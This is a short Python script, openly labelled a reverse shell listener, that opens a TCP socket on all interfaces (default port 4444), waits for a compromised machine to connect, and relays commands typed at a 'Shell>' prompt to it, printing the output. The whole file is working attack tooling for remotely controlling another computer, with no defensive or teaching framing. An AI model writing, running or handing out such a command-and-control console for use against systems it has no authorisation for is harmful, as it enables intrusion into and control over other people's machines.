#!/usr/bin/env python3
"""
Reverse Shell Listener
Listen for incoming reverse shell connections
"""

import socket
import argparse

def start_listener(port):
    """Start listening for reverse shell connections"""
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', port))
        server.listen(1)

        print(f"[*] Listening on 0.0.0.0:{port}")
        print("[*] Waiting for connection...")

        client, addr = server.accept()
        print(f"[+] Connection received from {addr[0]}:{addr[1]}")

        while True:
            command = input("Shell> ")

            if not command:
                continue

            if command.lower() in ['exit', 'quit']:
                client.send(b'exit\n')
                break

            client.send((command + '\n').encode('utf-8'))
            response = client.recv(4096).decode('utf-8')
            print(response, end='')

    except KeyboardInterrupt:
        print("\n[!] Listener stopped")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        try:
            client.close()
            server.close()
        except:
            pass

def main():
    parser = argparse.ArgumentParser(description='Reverse Shell Listener')
    parser.add_argument('-p', '--port', type=int, default=4444, help='Port to listen on (default: 4444)')

    args = parser.parse_args()

    start_listener(args.port)

if __name__ == "__main__":
    main()
